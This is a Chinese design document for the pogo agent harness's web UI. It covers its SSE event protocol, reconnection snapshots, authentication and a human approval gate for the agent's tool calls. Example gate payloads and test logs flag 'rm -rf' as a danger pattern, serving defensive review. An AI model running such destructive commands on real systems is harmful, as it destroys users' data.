# pogo Web UI 设计

> 浏览器执行架构于 2026-10-06 收敛为原生单一路径，见 §21 与 [迁移说明](browser-native-only.md)。§19 的面板代理记录描述旧入口及独立嵌入，不是当前 Agent 执行方式。
> 历史状态：**已实现并可用。** 服务端用 curl + 真实模型压实，前端有 472 个单测（含真实 SSE 录制回放，2026-08 快照）。
> 唯一未做的验证是**人眼过一遍界面**，清单见 §15.2。
> harness 层（循环、工具、协议、会话）的设计见 `harness-design.md`；使用说明见 `../README.md`。
> UI/UX 参考 `../../参考资料/YX代码/前端`（Vue3 + TS + Element Plus）。

---

## 1. 目标与非目标

给 pogo 加一个浏览器界面，让它的 harness 行为**可见**：模型在想什么、调了哪个工具、工具返回了什么、失败后怎么自己纠正、这一轮花了多少 token。

Web 是第二个事件消费者，不是终端渲染器的替代品。核心循环的形状不变，但**碰了 `loop.go` 两处**：工具结果结构化（§5.1）和审批闸门插桩（§8.2）。

### 非目标（明确不做）

| 不做 | 原因 |
|---|---|
| **规划模式 / plan mode** | pogo 是扁平 ReAct 循环，没有分诊、规划、子任务、重评估。YX 的 `plan_mode`、`subtasks`、执行波次全部不移植 |
| SQL 编辑器 / 图表 / 关系图 | YX 的领域产物（SQL 分析 agent），pogo 的产物是文件改动和命令输出 |
| MCP | 协议层仍在不做清单上；数据模型已采用（skill 的 `tools.json`，MCP Tool 对象形状，`GET /api/tools` 出目录） |
| ~~todos~~ | **已实现**，前端渲染见 `web-ui-frontend.md` §3。当初列进非目标是因为它被读成 plan mode 的一部分；实际落地的是一个纯函数工具，不持有状态、不做调度，与规划模式无关 |
| ~~上下文压缩（compaction）~~ | **已实现**（control `compact` action、`compacted` 事件、前端 `/compact` 命令与 ContextMeter 入口），见 §2 |
| **`-p` 的 Web 等价物** | 不做「提交任务 → 轮询」那套。`-p` 留给 subagent，见 §12 |

---

## 2. 实现状态

分五个阶段做的，五个都已完成；之后落地的能力逐项补记在同一张表里：

| 阶段 | 内容 | 状态 |
|---|---|---|
| W1 | 数据地基：`Tool` 返回 `Result{Text, Details}`、移植 diff 生成、会话列表 | ✅ |
| W2 | loop 改造：`ToolGate` 钩子、并行执行、per-path 锁 | ✅ |
| W3 | `web/`：Manager + Hub + Runner + SSE + control + WebGate | ✅ |
| W4 | 前端：`web/ui/`，timeline + 四个工具渲染器 + DiffView + GateCard | ✅ |
| W5 | 打磨：ContextMeter + ModelPicker + 语法高亮 + 会话重命名/置顶 | ✅ |
| M1–M5 | workspace 文件面板：只读 API → 树/预览 → 会话改动 tab → journal + 工作区累积 diff → 面板内编辑 + quick open（§16） | ✅ |
| — | 会话内 pty 终端（§17） | ✅ |
| — | 撤回 + 影子仓 checkpoint（§18） | ✅ |
| — | 委派子运行 subagent 全套：`tools/subagent.go` + `web/subagent.go` + 前端 `SubagentSheet.vue`（§8.10、§12） | ✅ |
| — | `-mode json` 输出模式（`main.go` + `jsonmode.go`，与 web 共用 `wire` 包同一批事件常量，§12） | ✅ |
| — | 委派运行的审批经 fd 管道转发父进程裁决（`gatefd.go` + `tools/gatechan.go`，§8.10） | ✅ |
| — | 后台委派：`tools/subagent_bg.go` 的 `subagent_tasks` 工具与结果通知（§12） | ✅ |
| — | 按轮落盘：`agent/persist.go` 的 `TurnPersister`，CLI（`main.go`）与 web（`web/runner.go`）均已接入 | ✅ |
| — | 上下文压缩 `/compact`：control `compact` action + `compacted` 事件 + 前端 ContextMeter 入口 | ✅ |
| — | 主题系统：`web/ui/src/theme/`，15 套皮肤（2026-08 快照） | ✅ |
| — | 账号密码登录：`web/auth.go` + `POGO_USERS_FILE` + `main.go` 的 `-hash-password`（§8.1） | ✅ |
| — | 浏览器工具（§21） | ✅ |
| — | 剩下的见 §15.1，没有一项是阻塞性的 | ◐ |

### 2.1 已用 curl + 真实模型验证的（W3 的支柱）

| 验收项 | 结果 |
|---|---|
| **run 存活** | 跑 `sleep 20`，第 10 秒左右 kill 掉订阅的 curl → 重连拿到完整快照，`details.duration_ms` 是 **20009**，命令跑满全程 |
| **断连重连** | 不带 `from` 重连 → 单帧 `snapshot`，内容完整；带 `?from=26` → 只回放 5 条语义事件，中间十几条 token delta 正确地不在日志里 |
| **闸门超时后 loop 继续** | `gate_request`（带 `danger:["rm -rf"]` 和绝对 deadline）→ 不回应 → `gate_resolved{by:"timeout"}` → `tool_end{is_error:true}` → **turn 2** → `run_end{end_turn}`。模型自己回了「命令未被执行：你在 25 秒内没有批准这次调用」 |
| **闸门跨重连** | 待决时断开重连 → 快照里 `pending_gates` 的 `gate_id` 与 `deadline` 与原事件逐字相同，本地算出剩余 2.8s |
| 409 三处 | 重复发起 / 运行中删除 / 运行中切模型 |
| cancel | 杀掉整个 bash 进程组（不是只断连接） |
| 鉴权 | 401（含 SSE）、403 跨域、非 loopback 警告、静态资源免 token |
| dev 代理 | `-web-dev` 下 vite 的 dev HTML 与 `/src/main.ts` 穿透，`/api` 仍由 Go 处理 |

### 2.2 测试

```bash
go test -race -count=1 ./...            # 836 个用例（web 包 174 个）
cd web/ui && npm test && npm run check  # 472 个用例（36 个文件）+ vue-tsc
```

（2026-08 快照。统计口径：Go 侧 `grep -rc '^func Test' --include='*_test.go'` 按文件汇总，前端按文件 `grep -c 'it('`。）

前端测试分三类，第二类是关键：

- `timeline.test.ts`（100）：纯函数行为——轮次编号、运行态、闸门归位、孤儿闸门、纠错关联、SSE 帧解析、subagent frame 投影
- 其余 34 个纯逻辑文件（2026-08 快照，按 `it(` 数排序的前几名）：`navCards`（33）、`browserDom`（31）、`elementPicker`（22）、`dockSheets`（22）、`argsPreview`（17）、`contextEstimate`（17）、`textTail`（17）、`highlight`（16+6）、`gitBar`（14）、`browserExec`（13）、`followups`（12）、`browserPane`（12）、`ansi`（11）……完整清单用上面的命令实测
- `replay.test.ts`（16）：**回放一段真实运行的 SSE 录制**（`__fixtures__/real-run.sse`：真模型、真 edit 改文件、真闸门弹卡并批准、真 bash），断言最终时间线里有 diff、bash exit 0、无残留运行态；还模拟一次中途重连，断言快照重放后状态与不中断的重放一致

手写事件只能证明客户端符合**我对协议的想象**，录制才能证明它符合**服务端的实际行为**。§6.3 那条顺序约束就是这么发现的。

---

## 3. 从 YX 借什么

### 借了

| 借什么 | 出处 | 说明 |
|---|---|---|
| **fetch + ReadableStream 的 SSE 客户端** | `api/agent-qa.ts:434` | 不用 `EventSource`：请求要带 `Authorization` 头，而 EventSource 设不了头（它给的理由是 POST body，同样成立） |
| **优雅取消走独立 control 通道** | `index.vue:1101` | 优先 `POST /control {action:"cancel"}` 而非 `abort()`。pogo 的 bash 会 fork 子进程，断连接不等于杀进程 |
| **`call_id` 作为工具调用一等标识** | 全局 | 串起 tool_start / tool_end / 等待态 / 闸门。并行批次乱序完成因此不需要特殊处理 |
| **大结构化产物走专用字段** | `expand_graph` 事件 | pogo 对应的是 diff，见 §6.4 |
| **纯函数把事件状态映射成视图** | `trace.ts:164 buildTrace()` | 无 Vue 依赖、可离线单测。`timeline.ts` 照这个模式写 |
| 审批卡的超时冻结/恢复双向协商 | `ConfirmCard.vue` | 整套借鉴，改了两处，见 §8.6 |
| Element Plus + SCSS + markdown-it | 全局 | 同栈，降低接入成本 |

### 没借

- **`Turn` 数据模型**：它是为 plan-execute 图设计的（`subtasks` + `steps: Record<subtask_id, Step[]>` + `phases`），pogo 照搬会得到一堆永远空的字段和走不到的波次代码。改成镜像 pogo 自己的 `llm.Block`，见 `web-ui-frontend.md` §2
- **`TraceTree` 递归树**：pogo 只有两层（轮次 → 工具调用），树形结构在这里是多余的抽象
- **`CodeBlock` 的手写 tokenizer**（441 行）：它的 JSON/SQL 分支对 pogo 没意义，需要的是 Go/TS/shell。语法高亮推到 W5
- **`SqlEditor` / `AnswerChart` / `ExpandGraphCard` / `ContextPanel`**：全是 SQL 分析领域的

### 它的三个已知问题也没继承

1. **4723 行单文件**（其中 2000 行 `<style scoped>`），零 composable → 这边拆成 12 个文件，最大的 `AgentView.vue` 571 行含 250 行样式
2. **滚动跟随没有用户意图判定**（往上翻历史会被强行拉回底部）→ 这边距底 > 80px 就停止跟随，回到底部恢复
3. **每 token 全量重算**（`parseAnswerBlocks` + `md.render` + `buildTrace` 都在模板里内联调用）→ 这边 `liveVersion` 80ms 节流 + markdown 只在定稿后渲染一次
4. **客户端断连即杀运行**（`bridge.py` 的 `finally` 里 `task.cancel()`）→ 这是本方案要解决的核心问题，见 §7

---

## 4. 整体架构

```
┌─ 浏览器 (Vue3 + TS) ────────────────────────────────────┐
│  POST /api/sessions/{sid}/messages   发起一轮            │
│  GET  /api/sessions/{sid}/stream     订阅事件 (SSE)      │
│  POST /api/sessions/{sid}/control    取消 / 审批 / 策略    │
└───────────────────────┬─────────────────────────────────┘
                        │
┌─ web/ ────────────────┴─────────────────────────────────┐
│  server.go   HTTP 路由、鉴权、静态资源                     │
│  auth.go     账号密码登录（POGO_USERS_FILE + cookie，§8.1）│
│  ui.go       embed.FS + SPA 回退                         │
│  wire.go     agent.Event → SSE 帧的 DTO（28 种事件，§6.2） │
│  hub.go   ★  每会话事件日志 + 订阅者扇出 + 快照 + 派生状态   │
│  runner.go ★ 后台跑 agent.Run，寿命属于 session 不属于连接  │
│  manager.go  会话注册表、并发控制、TTL 回收                │
│  gate.go  ★  WebGate：实现 agent.ToolGate（两条泳道，§8.7）│
│  policy.go   放行策略、危险模式高亮                        │
│  subagent.go 委派运行的审批转发 + 启动预算校验（§8.10）     │
│  terminal.go / checkpoint.go  pty 终端（§17）、撤回（§18） │
│  files.go / workspace.go / sessionio.go  文件面板、工作区   │
│              改动、会话导入导出与 transcript（§11、§16）    │
│  browser.go / background.go / followups.go  浏览器工具      │
│              （§21）、后台委派、后续建议（§20）             │
│  panels.go / settings.go / skills_upload.go /              │
│  userstarters.go / uiprompt.go  面板反代、配置、skill       │
│              上传、starter 卡、提示装载                     │
│  ui/         Vue 源码，构建产物 embed 进二进制             │
└───────────────────────┬─────────────────────────────────┘
                        │
┌─ harness ─────────────┴─────────────────────────────────┐
│  agent.Agent ── llm.Client ── tools.Registry ── session.Store │
└─────────────────────────────────────────────────────────┘
```

**单文件分发**：前端构建产物用 `embed.FS` 打进二进制，`pogo -web` 直接起服务。这是 Go 的主要优势，不丢掉。开发期用 `-web-dev http://localhost:5173` 反代到 vite。

**关键决策：run 的寿命属于 session，不属于 HTTP 连接。**

`Runner` 在后台 goroutine 里消费 `<-chan agent.Event`，转成 wire event 发给 `Hub`；`Hub` 落进事件日志并扇出给所有订阅者。SSE handler 只是订阅者，它死掉不影响 run。

这是与 YX 相反的选择，所以僵尸问题必须自己解决，见 §7.5。

---

## 5. Go 侧的地基

### 5.1 `Tool` 返回 `Result{Text, Details}`

详见 `harness-design.md` §5。这里只强调对界面的意义：**`EditDetails.Diff` 就是 DiffView 的数据源**，而它不进 LLM 上下文——diff 给模型看是浪费 token（那是它刚写的），给人看才有价值。

对比 pi：它的 `edit` 除文本外还返回 `details: {diff, patch, firstChangedLine}`（`edit.ts:118`）。pogo 当初为了极简把 diff 生成整个丢掉了，只回一句 `Successfully replaced 1 block(s)`。W1 把它补回来了（含零依赖的 `diff` 包）。

### 5.2 会话并发安全

`agent.Agent` **不是并发安全的**：

- `a.messages` 在 goroutine 里 append，`Run()` 被并发调用就是 data race
- `SetClient()`（切模型）直接改字段，无同步
- `tools.Default(cwd)` 把工作目录烧进 registry，路径守卫是 per-registry 的 → **每会话要有独立 registry**

`manager.go` 因此保证：`map[sessionID]*Session`，每个 Session 至多一个活跃 Runner，**同一会话同时只允许一个 run**（重复发起返回 409）。跨会话并行不受限。切模型在运行中返回 409，因为 `SetClient` 写的字段被 loop 每轮读。

### 5.3 事件 DTO

`agent.Event.Err` 是 `error`，不能 JSON 序列化。`web/wire.go` 做转换，并引入 run 内单调递增的 `message_id`。不改 `agent.Event` 本身。

**`message_id` 由 Hub 在 `turn_start` 时铸造**（一轮 = 一条 assistant 消息），`token` / `thinking` / `message` 事件由 Hub 在发布时填入。让发布方维护这个编号会让 Runner 和 Hub 各存一份同样的状态。

---

## 6. 事件协议

### 6.1 帧格式

```
id: 42
event: tool_start
data: {"seq":42,"ts":1785672346123,"call_id":"tool_abc","name":"edit","args":{...}}

```

`id:` 是会话内单调递增的 `seq`，供 §7.3 的手动重连定位。DTO 是**扁平 union**（`web.Event`，所有字段 `omitempty`）而不是嵌套的 `data` 对象：代价是结构体很宽，收益是每个字段的名字和类型都只在一处定义，消费者不用猜 payload 形状。

### 6.2 事件清单（31 种）

31 = 10 个 loop 事件 + 21 个 web 自有事件。loop 事件名已上提到顶层 `wire/` 包（`wire/wire.go`），与 `-mode json` 共享同一批常量——`web/wire.go` 用类型别名引用它们而不是重新声明，所以浏览器和读 JSONL 的脚本不可能对 `tool_end` 是什么意思产生分歧。web 自有事件（snapshot、闸门、策略、委派等）刻意不进 JSON 模式的契约。

| SSE event | payload 要点 | 说明 |
|---|---|---|
| `snapshot` | `{seq, messages, results, live, run, policy, usage, bg_tasks, context_tokens, overhead_tokens, overhead_breakdown, clear_trigger, followups}` | **不带 `?from=` 时的第一帧**，见 §7.3 |
| `run_start` | `{run_id, model, provider}` | web 自有；JSON 模式对应的是首行 `session` header |
| `user_message` | `{message_id, text, content?, client_id?}` | 用户的提问。多标签页时 B 页要看到 A 页提交的问题出现。**跑动中的插话也走这个类型**（由 loop 在真正送达的那一刻发出，见 §7.7），所以前端不需要第二套渲染。带附件时 `content` 是完整首条消息（image/file 块都在，与快照口径一致——增量路径丢掉它曾导致 chip 刷新页面才出现）；`client_id` 回显 POST 里的乐观气泡 id，发送方据此让占位气泡退场 |
| `turn_start` | `{turn, message_id, context_edit?, overhead_tokens?, overhead_breakdown?}` | loop 的第 N 轮，UI 用它划分轮次。本轮 prompt 清过旧 tool_result 时带 `context_edit`，是上下文仪表突然下降的解释。工具视图改变了固定开销时（Skill 带来了工具、选中了 MCP 工具）带新的 `overhead_tokens` 和分项 |
| `thinking` / `token` | `{message_id, text}` | 增量，**不入日志**，见 §7.4 |
| `message` | `{message_id, role, content:[Block], usage}` | 定稿的 assistant 消息，客户端用它替换累积的增量文本（纠偏）。`usage` 是**这一轮自己的**，不是累计——口径与仪表见 `web-ui-frontend.md` §6 |
| `tool_args` | `{call_id, name?, text}` | 工具参数还在流式生成中的片段——在审批、在 `tool_start` 之前。`name` 只在首帧带。不入日志，折进 `live.incoming`（前端用它渲染「正在写一个大文件」的渐进预览卡） |
| `tool_start` | `{call_id, name, args}` | 闸门之后发出，所以带的是**实际执行的参数**（含改写后的） |
| `tool_partial` | `{call_id, name, text, frame?}` | 还在运行的调用打印的输出，`text` 是**增量**。与 token delta 同一条规则：**不进重放日志**，折进 `PendingTool.Output`（上限 32KB，保留尾部）。可以整体忽略 —— settled 输出总会随 `tool_end` 到达，所以漏掉每一个片段也不会算错。会发它的工具：`bash`（增量输出）和**委派运行**（`frame` 字段携带子运行的结构化进度帧，前端用已有组件渲染子运行；帧同时折进 `PendingTool.Frames` 供重连恢复） |
| `tool_end` | `{call_id, name, text, is_error, details, duration_ms}` | `details` 见 §6.4。到达后 `PendingTool` 连同它的 live 输出一起消失，settled 结果接手 —— 两者不会同时渲染 |
| `gate_request` | `{gate_id, call_id, tool, args, deadline, danger[], origin?}` | 弹审批卡。`origin` 非空表示来自某个委派运行（§8.10） |
| `gate_deadline` | `{gate_id, deadline, frozen?, remaining_ms?}` | 改写时同步暂停状态与剩余时间；取消改写后恢复为新的绝对时间 |
| `gate_resolved` | `{gate_id, allow, reason, by}` | `by` = `user` / `timeout` / `cancel` |
| `gate_auto` | `{call_id, tool, rule}` | 自动放行的审计记录，不弹卡。`rule` = `policy:auto` / `policy:standard` / `session:tool:<name>` / `session:command` |
| `policy_changed` | `{policy, by}` | 广播给该会话所有订阅者 |
| `policy_reverted` | `{policy, from, to, reason}` | 限轮 auto 到期自动回退（§8.9） |
| `model_changed` | `{model, provider, context_window, clear_trigger?, overhead_tokens?, overhead_breakdown?}` | 热切换要广播；窗口变了仪表要跟着重算 |
| `retry` | `{attempt, max, delay_ms, reason}` | 来自 `llm.OnRetry` 钩子 |
| `rewound` | — | 会话被撤回到更早的消息：手里那条点之后的一切都描述一条不再存在的分支，只有新快照能重建真相。**不入日志**——它是控制信号而不是历史，日志清空本身就会逼重连的客户端走快照路径 |
| `subagent_start` / `subagent_frame` / `subagent_end` | `{task_id, ...}` | 一个**后台**委派的进度。web 自有，因为后台任务属于会话而不属于任何 run：发起它的 run 通常早就结束了，进度没法走 run 的事件通道。`subagent_frame` 是进度，不入日志（折进 `bg_tasks`）；start/end 是状态迁移，入日志。`subagent_end` 由 Hub 补 `frames[]`，让漏过帧的客户端把卡片补全 |
| `compacted` | — | 对话被压缩成自己的摘要。结构上与 `rewound` 是同一种消息（手里的一切已失效，只有新快照能重建），但刻意不同名：一个是被放弃的分支，一个是整段历史的浓缩 |
| `followups` | `{message_id, chips[]}` | 刚结束那轮 run 的生成式追问建议（§20）。web 自有：生成发生在 run 结束之后、loop 不知道的 goroutine 里，所以可以远晚于 `run_end` 到达——建议绝不应该拖累它所依附的回答 |
| `attachment_uploaded` | `{attachment:{path, name, kind, mime, size, ...}}` | 文件经上传端点落盘的那一刻发布——先于、也不依赖于任何消息携带它。文件树据此（防抖）刷新，「本会话的文件」浮层据此计数。**入日志**，`?from=` 恢复的重放能补听；全新快照不重放它，那是 GET attachments 列表的用途 |
| `image_describe_start` / `image_describe_end` | `{image_ref, image_name}`，end 带 `{text? , error?, duration_ms}` | 文本模型发图时的**步骤 1/2**：视觉模型逐图描述。web 自有——helper 不是 loop，且描述发生在首个 turn 之前，伪装成 tool 事件就是伪造转录里不存在的 tool_use 块。入日志（同 subagent start/end 的理由），重连重放到 start 就显示「识别中」。描述同时写进该图 block 的 `image_alt`：首条消息落盘带它，Hub fold 在 end 时把它补丁进内存态消息（copy-on-write，Content 切片与已扇出事件共享）——气泡的「识别描述」和快照路径都读它，刷新后卡片不丢；end 失败时 alt 是占位说明，run 照常继续 |
| `run_end` | `{stop_reason, end_reason, usage, error, undelivered[]}` | `end_reason` 是 harness 自己的词汇（`turn_limit`、`stagnation` 等，定义在 `agent/endreason.go`），是唯一能说出运行为何结束的字段。`undelivered` 是接受了但没送达的插话，见 §7.7 |
| `error` | `{error}` | |

YX 剩下的 11 种（`route`/`plan`/`replan`/`task_update`/`sources`/`clarify`/`skill_hit`/`result_table`/`expand_graph`/`feedback`/`cancelled`）都是它的领域事件，**一个都不补**。`cancelled` 不单独发，取消体现在 `run_end.stop_reason`。

`skill_hit` 原本写的是「唯一将来会补的」，实现 skills 时决定不补：加载一个 skill 就是一次 `read`，`tool_end` 已经把这件事放上时间线了，再发一个事件是把同一个事实说两遍，还要给日志和快照结构加字段。前端改成在 read 卡片上打一个 skill 徽标，数据源是 `tool_use.input.path`（见 `web-ui-frontend.md` §3）。

### 6.3 一条顺序约束：gate 事件可能先于它引用的 message

录真实运行时发现的**协议事实**：

```
turn_start → gate_request → message（里面才有这个 call_id 的 tool_use）
```

原因是闸门**自己发事件**（§8.2 的设计：loop 只消费裁决，`ToolGate` 不知道 UI 存在），而 `message` 走 loop 的事件 channel 由 Runner 转发。两条路径在 Hub 锁上竞争，而 loop 发完 message 就立刻进闸门，所以反序**稳定复现**。

**快照永远自洽**（它是派生状态），只有实时流在这两条路径之间无序。

三种处理办法里选了最简单可靠的：**前端渲染 call_id 未知的待决闸门**（`timeline.ts` 的 `adoptOrphanGates`）。另两种（服务端加屏障、Hub 里缓存重排）都要动并发代码，而且客户端**无论如何**都得容错——日志截断后重连会遇到同样情形。

### 6.4 为什么 `details` 单独走而不是塞进 `text`

`tool_end.text` 是**回给模型的那份**，已被截断到 2000 行 / 50KB。`details.diff` 是**给人看的那份**，不受截断限制，也不进 LLM 上下文。

这就是 YX 用 `expand_graph` 绕开 observation 600 字符截断的同一个道理，只是产物换成了 diff。

---

## 7. 断线重连与缓存

### 7.1 问题

刷新浏览器会断，两个独立原因：

1. **run 的寿命绑在连接上** —— YX 的 `bridge.py` 在 `finally` 里 `task.cancel()`，注释是「客户端断连也在此清理，避免僵尸运行」。**所以刷新杀掉 run 是它的设计，不是 bug**
2. **没有任何重放机制** —— 即使 run 活着，新连接也拿不到已经发过的事件

两个都解了。

### 7.2 事件日志 + 订阅者扇出

每个会话一个 `Hub`，它是**唯一的状态机**：快照和实时流都由同一次 fold 产生，所以两者不可能互相矛盾。

`Publish(e)`：加锁 → 分配 `seq` → `apply()` 折叠进派生状态 → 追加日志（只有语义事件）→ 非阻塞扇出给每个订阅者。

**订阅者写满就丢弃它**（关掉 channel），它随后自己带 `?from=<lastSeq>` 重连补齐。日志的存在让「慢消费者」这个经典难题不需要任何策略。每个订阅 channel 的缓冲是 **256 条事件**（`web/hub.go` 的 `subBuffer`）——注意这与 pty 终端的 256KB backlog（`web/terminal.go`）是两处不同的缓冲，一个按事件条数、一个按输出字节。

`Subscribe(from)`：**在同一把锁内**完成「快照或日志切片 + 注册 channel」，这样既不漏事件也不重复。

### 7.3 两种重连路径

```
GET /stream            → 快照路径
GET /stream?from=42    → 增量路径
```

**快照路径**（浏览器刷新、新标签页、首次进入）：首帧 `snapshot`，之后从当前 seq 继续推送实时事件。

```json
{
  "seq": 87,
  "messages": [ {"id":"u1","role":"user","content":[{"type":"text","text":"..."}]},
                 {"id":"m2","role":"assistant","content":[{"type":"thinking"},{"type":"tool_use"}]} ],
  "results": { "tool_abc": {"call_id":"...","name":"bash","text":"...","is_error":false,"details":{...}} },
  "live": { "run_id":"a1b2","active":true,"turn":3,"message_id":"m5",
            "thinking":"已累积的思考全文","text":"已累积的回答全文",
            "pending_tools":[{"call_id":"tool_x","name":"bash","args":{},"started_at":0}],
            "pending_gates":[{"gate_id":"g1","call_id":"tool_y","tool":"bash",
                              "deadline":1785672400000,"danger":["rm -rf"]}] },
  "run":    {"active":true,"model":"k3","provider":"kimi"},
  "policy": {"mode":"standard"},
  "usage":  {"input":1817,"output":104,"cache_read":768}
}
```

三个形状上的决定：

**`messages` 里没有 `tool_result`。** 它们被抽进 `results` 边表，按 `call_id` 索引。原因是**从 JSONL 恢复的历史和实时渲染必须同形状**：不抽的话，`-resume` 的会话里 tool_result 内联在 user 消息中，而实时会话里它是 `tool_end` 事件,前端要写两套渲染。`Hub.Seed()` 负责拆分，工具名从发起调用的 assistant 消息里回填（result block 自己不带工具名）。

**`pending_gates` 里的 `deadline` 是绝对时间戳**（epoch ms），客户端本地算剩余——这是刷新后审批卡能显示正确倒计时的前提，见 §8.6。

**`policy` 必须在快照里**，否则刷新后 PolicyPicker 会显示成默认模式，而闸门实际还是关着的。

**增量路径**（网络抖动，客户端本地状态还在）：回放 `seq > from` 的日志条目，然后转实时。日志已经放不下那么远时**自动降级成快照**（`canReplay`）。

前端策略：**页面刷新一律走快照路径**（本地无状态，快照总是对的）；只有 SSE 读流中途异常而页面没重载时才带 `from` 重连，退避 500ms → 5s。

**一个必须知道的推论：快照不重放 `run_end`。** run 已经结束时重连，只会拿到 `snapshot.run.active == false`。任何「等运行结束」的逻辑必须同时接受这两个信号。

### 7.4 日志的内存边界

日志只存**语义事件**（`turn_start` / `message` / `tool_start` / `tool_end` / `gate_*` / `retry` / `run_end`），一轮几十条。

`thinking` / `token` **不逐条入日志**，只累加进 `live`。它们仍然实时扇出给在线订阅者（打字效果不丢），重连时以 `live` 里的全文形式一次给出。

**这是个明确的取舍：快照不重放逐 token 的打字过程。** 刷新后的浏览器要的是当前状态，不是打字动画。代价是重连的人看不到那段动画，收益是内存与 transcript 成正比而不随 token 数爆炸。

护栏：单会话日志超过 2000 条丢弃最旧的——反正定稿内容在 JSONL 里，快照路径能重建。

### 7.5 僵尸运行的防治

既然不再靠「断连即杀」，得自己兜住：

| 机制 | 说明 |
|---|---|
| **单 run 硬超时** | `context.WithTimeout`，默认 30 分钟 |
| **空闲回收** | 无订阅者且无活跃 run 持续 15 分钟 → 从内存驱逐（状态在 JSONL 里，下次请求透明重建） |
| **显式取消** | `POST /control {action:"cancel"}` → `context.CancelFunc` → 贯穿 HTTP 请求与 bash 的整个进程组 |
| **进程退出** | 优雅关闭时取消所有 run，5 秒后强制关闭连接（SSE handler 不会自己返回） |

`-max-turns`（默认 50）和 bash 的 120 秒超时仍然生效，是第二道防线。

### 7.6 多客户端同会话

多个标签页订阅同一会话都能拿到同一份流，天然支持。**但同一会话同时只允许一个 run**：第二次 `POST /messages` 得到 409。运行中输入框**不再置灰** —— 发送会变成插话，见 §7.7。

策略是服务端状态，靠 `policy_changed` 广播同步。**会话列表目前不跨标签页同步**（只在新建/发送/删除时刷新），这是已知缺口。

### 7.7 跑动中插话（steering）

`POST /control {action:"steer", prompt}` 把一条消息塞进正在跑的那个 run，`{"steered":bool}` 告诉客户端有没有塞进去。在这之前，看着 agent 往错方向跑只有两个选择：取消掉整轮，或者干等。

**注入点是硬约束而不是偏好**：消息只能落在「上一轮的 tool_result 之后、下一次模型调用之前」。再早一点就插在 tool_use 和它的 tool_result 之间，那样的请求会被 API 拒绝，而且会话从此不可恢复。所以事件由 loop 在真正送达的那一刻发出（`agent.EventSteer` → 线上的 `user_message`），而不是由 HTTP handler 在收到时发出 —— 时间线要显示它进入对话的位置，不是它被打字的时刻。

**`steered:false` 不是错误。** 它意味着 run 在点击和请求之间结束了，客户端的下一步是当普通消息发出去。用状态码表达会把一个正常竞态渲染成失败。`Steer` 返回布尔而不是让客户端先查 `run.active` 也是为此：先查后发是 TOCTOU，答案必须来自接受消息的那把锁。

**模型本来要停时，队列非空就继续。** 这顺手拿到了 pi 的 `getFollowUpMessages`，而且堵住一个真实的洞：用户往往是看着答案快写完了才打字，那条消息恰恰最需要送达。

**接受了但送不出去的窗口关不掉。** 消息可以在 loop 撞上 `maxTurns`、遇到传输错误或被取消的前一刻被接受。所以 `run_end` 带 `undelivered[]`，前端把文本放回输入框并说明原因 —— 默默丢掉用户打的字比拒绝更差，因为拒绝至少是可见的。

终端模式没有插话：REPL 在跑的时候是阻塞的，用户根本没法打字。`-p` 也永远不该有，它要留给 subagent，那里没有人。

---

## 8. 安全与审批闸门

### 8.1 传输层基线

**pogo 的 `bash` 工具没有路径限制**（`read`/`write`/`edit` 有，bash 没有）。CLI 场景下这没问题——用户本来就在 shell 前面坐着。**Web 服务不一样：暴露出去等于提供一个 RCE 即服务。**

| 措施 | 说明 |
|---|---|
| **默认只绑 `127.0.0.1`** | 绑到外部地址会额外打印警告 |
| **token 永远必需** | 没有关闭开关。未设 `POGO_WEB_TOKEN` 就随机生成一个并打印（照 jupyter 的做法）。原设计是「绑 0.0.0.0 时才强制」，收紧了：**「无鉴权版本」这个形态一旦被谁跑起来就收不回来** |
| **鉴权范围是 `/api/*`** | 页面和 bundle 不需要 token，见下 |
| **同源限制** | 校验 `Origin`，不开 CORS。`-web-dev` 时额外接受 vite 的 origin |
| **工作目录固定** | 启动时 `-C` 指定一个根，会话不能换目录 |

**token 是双通道里永远存在的那一条。** 对脚本与 API 调用，token（`Authorization: Bearer` 或 `?token=`）永远必需，没有关闭开关。设了 `POGO_USERS_FILE` 之后，浏览器可以改走第二条通道：账号密码登录 + 无状态 session cookie（`web/auth.go`；`serve.go` 里由环境变量启用）。`Server.authorized` 任一通道命中即放行（`web/server.go`），token 通道不因登录功能存在而失效——脚本是 first-class 消费者。users.json 不存在时启动生成随机 admin 密码打印到日志，首个账号没有默认密码。

**为什么静态资源不能要 token**：浏览器**没法给它从 HTML 里发现的 `<script src>` / `<link href>` 加请求头**。页面用 `?token=` 打开没问题，但随后请求 `/assets/index-xxx.js` 时不带任何凭据 → 401 → 白屏。

所以划分是 **`/api/*` 一律需要，页面和 bundle 不需要**。这不降低安全性：bundle 就是二进制里那份代码，没有秘密；所有能做事的入口仍然要 token。

> 这条规则**双向脆弱**：往严格改一次就白屏，往宽松改一次就把 API 放开了。`TestStaticAssetsLoadWithoutATokenButTheAPIDoesNot` 守着两个方向。
>
> 前端从 URL 取 token 存进 sessionStorage，所以同一标签页刷新没问题；开新标签页要重新用带 token 的地址打开。

### 8.2 闸门在架构里的位置

pi 的做法是 `AgentLoopConfig.beforeToolCall`（`agent-loop.ts:508`）：返回 `{block: true, reason}` 时**不是抛异常**，而是变成一条 `is_error` 的 tool result，loop 继续跑。

这一点照搬了，因为它和 pogo 已有的错误自纠正是同一个设计：**拒绝是给模型的信息，不是运行的终止。** 模型看到「这条命令被用户拒绝了，原因是 X」之后可以解释、换方案、或者问你。如果拒绝会杀掉整轮，用户点一次「拒绝」就得从头再来。

```go
// 实现必须并发安全：并行批次会有多个 goroutine 同时进入 Review。
type ToolGate interface {
    Review(ctx context.Context, req GateRequest) GateDecision
}

type GateDecision struct {
    Allow bool
    // Reason 在 Allow=false 时作为 is_error 的 tool result 文本回给模型。
    Reason string
    // Args 非 nil 时替换原参数：这是「改写后批准」路径。
    Args json.RawMessage
}
```

终端自己用时传 nil（`newChildGate()` 拿不到审批 fd 就是 nil，行为完全不变，这是 `-p` 保持可脚本化的前提）。实现有两个：`WebGate`（浏览器弹卡，本节）和 `gatefd.go` 的 `childGate`（委派子进程把问题经管道转发给父进程裁决，见 §8.10/§12）。

三条契约：

1. **必须并发安全。** 想要「同时只弹一张卡」应该在实现内部串行（每条泳道一把 mutex，见 §8.7），**不要**因此把整批改成串行执行
2. **可以长时间阻塞等人，但必须尊重 `ctx`**
3. **拒绝是信息不是终止**

闸门插在 `tool_start` 事件**之前**，所以事件里带的是**实际执行的参数**（含改写后的）。「等待审批」这个状态由 `WebGate` 自己发事件给前端（这带来 §6.3 的顺序约束），loop 只消费裁决结果。

### 8.3 策略：哪些调用需要人工过目

全部都问 = 不可用（模型一轮就调好几次 `read`）。全部不问 = 闸门没意义。分级：

